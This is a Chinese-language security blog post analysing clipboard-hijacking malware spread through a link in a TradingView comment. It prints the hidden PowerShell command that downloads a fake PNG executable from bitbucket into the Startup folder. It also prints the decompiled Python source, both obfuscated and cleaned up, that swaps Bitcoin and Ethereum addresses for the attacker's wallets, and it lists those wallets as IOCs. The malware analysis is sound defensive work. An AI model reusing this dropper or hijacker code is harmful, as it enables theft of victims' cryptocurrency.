---
title: "Clipboard hijacking cryptocurrency malware on tradingview.com"
date: 2020-08-16 16:24:04
categories:
- [security, news]
tags:
- security
- news
---

最近在 tradingview.com 上面看到這篇 Idea [EOS - footprints of institutional money](https://www.tradingview.com/chart/EOSUSDT/SDsMZhix-EOS-footprints-of-institutional-money/)，看起來像是正常的分析趨勢走向的 Idea，但是下面留言有一個連結 `mycryptorush.com/signals`，說是可以得到免費的 bitcoin 和交易趨勢訊號。

{% img /images/clipboard-hijack-1.png 'tradingview idea' %}

點下去其實是導向 `tinyurl.com/cryptorushsignals`，這個短網址又是導向 `https://bbuseruploads.s3.amazonaws.com/7e1f7e0b...`，會下載 `CryptoRushSignals.zip` 下來。看起來就很可疑，明明看起來是要去一個網站，卻載了檔案下來。解壓縮該 zip 檔之後有兩個檔案 `HOWTOUSE.txt` 和 `CryptoRushSignals.run.lnk`。

```plain HOWTOUSE.txt
Open CryptoRushSignals.run, this will open up a website were you can register.
It then automatically will open up an excel sheet with the live current signals.
```

純文字的說明文件，叫你執行 `CryptoRushSignals.run`，真的去執行之後，會跳出瀏覽器瀏覽 `https://t.me/MyCryptoradar`，讓你加入一個 telegram 群組，就可以收到一些指標數據的變化通知，裡面現在有 400 多人。

{% img /images/clipboard-hijack-2.png 'tradingview idea' %}

除了打開瀏覽器叫你加群組之外，他還秘密執行了下面這段 payload

```powershell
"C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Start-Process -FilePath "https://t.me/MyCryptoradar; Invoke-WebRequest -Uri "https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png" -OutFile C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start` Menu\Programs\Startup\pclp.exe
```

基本上就是去 bitbucket 下載 `https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png` 這個 png，然後放到開機自動執行的路徑，而且這個也不是 png，他就是一隻 PE 執行檔。

{% img /images/clipboard-hijack-3.png 'tradingview idea' %}

稍微看一下那隻 PE 執行檔後，發現他是用 py2exe 包的，那就用 [unpy2exe](https://github.com/matiasb/unpy2exe) 拆回 pyc，再用 [uncompyle6](https://github.com/rocky/python-uncompyle6) 就可以拆出原本的 python script 了。

```python 8.61.py
# uncompyle6 version 3.7.2
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.15 (default, Dec 23 2019, 14:00:59) 
# [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]
# Embedded file name: 8.61.py
# Compiled at: 2020-08-15 23:23:49
from __future__ import print_function
import sys
oo000 = sys.version_info[0] == 2
ii = 2048
oOOo = 7

def O0(ll_opy_):
    o0O = ord(ll_opy_[(-1)])
    iI11I1II1I1I = ll_opy_[:-1]
    oooo = o0O % len(iI11I1II1I1I)
    iIIii1IIi = iI11I1II1I1I[:oooo] + iI11I1II1I1I[oooo:]
    if oo000:
        o0OO00 = unicode().join([ unichr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) for i1iII1IiiIiI1, oo in enumerate(iIIii1IIi) ])
    else:
        o0OO00 = str().join([ chr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) for i1iII1IiiIiI1, oo in enumerate(iIIii1IIi) ])
    return eval(o0OO00)


import time, re, pyperclip, subprocess
if 0:
    ooOoO0O00 * IIiIiII11i
if 0:
    oOo0O0Ooo * I1ii11iIi11i

def I1IiI():
    while 0 < 1:
        try:
            o0OOO = None
            if 0:
                ooOo + Oo
            o0OIiiIII111iI = subprocess.Popen(['C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'Get-Clipboard'], stdout=subprocess.PIPE, startupinfo=IiII)
            o0OOO = str(o0OIiiIII111iI.stdout.read()).strip().decode('utf-8').rstrip(u'\x00')
            if o0OOO != iI1Ii11111iIi and o0OOO != i1i1II:
                if re.match(O0oo0OO0, str(o0OOO)):
                    pyperclip.copy(iI1Ii11111iIi)
                    pyperclip.paste()
                elif re.match(I1i1iiI1, str(o0OOO)):
                    pyperclip.copy(i1i1II)
                    pyperclip.paste()
        except Exception as iiIIIII1i1iI:
            print(iiIIIII1i1iI)

        time.sleep(1)
        if 0:
            o00ooo0 / Oo00O0

    return


if __name__ == O0(u'\u0829\u0862\u0863\u0872\u0867\u0869\u086f\u0861\u0862\u082b\u0805'):
    i1i1II = '0x22f338FC26Ea71EC884256C29103122c4578EE27'
    iI1Ii11111iIi = '14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS'
    O0oo0OO0 = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'
    I1i1iiI1 = '^(0x)?[0-9a-fA-F]{40}$'
    time.sleep(15)
    IiII = subprocess.STARTUPINFO()
    IiII.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    I1IiI()
    if 0:
        o0oooOoO0
    if 0:
        IiIii1Ii1IIi / O0Oooo00.oo00 * I11
    if 0:
        I1111 * o0o0Oo0oooo0 / I1I1i1 * oO0 / IIIi1i1I
# okay decompiling 8.61.py.pyc
```

有稍微混淆過的原始碼，重新命名一下變數就可以了。

```python
from __future__ import print_function
import time, re, pyperclip, subprocess

def main():
    while True:
        try:
            clipboard = None
            process = subprocess.Popen(['C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'Get-Clipboard'], stdout=subprocess.PIPE, startupinfo=startupinfo)
            clipboard = str(process.stdout.read()).strip().decode('utf-8').rstrip(u'\x00')
            if clipboard != btc_address and clipboard != eth_address:
                if re.match(btc_address_pattern, str(clipboard)):
                    pyperclip.copy(btc_address)
                    pyperclip.paste()
                elif re.match(eth_address_pattern, str(clipboard)):
                    pyperclip.copy(eth_address)
                    pyperclip.paste()
        except Exception as err:
            print(err)
        time.sleep(1)
    return

if __name__ == '__main__':
    eth_address = '0x22f338FC26Ea71EC884256C29103122c4578EE27'
    btc_address = '14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS'
    btc_address_pattern = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'
    eth_address_pattern = '^(0x)?[0-9a-fA-F]{40}$'
    time.sleep(15)
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    main()
```

他把你剪貼簿裡面符合 bitcoin 或 ethereum 地址格式的通通換成他錢包的位址。

## IOC

* 0x22f338FC26Ea71EC884256C29103122c4578EE27
* 14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS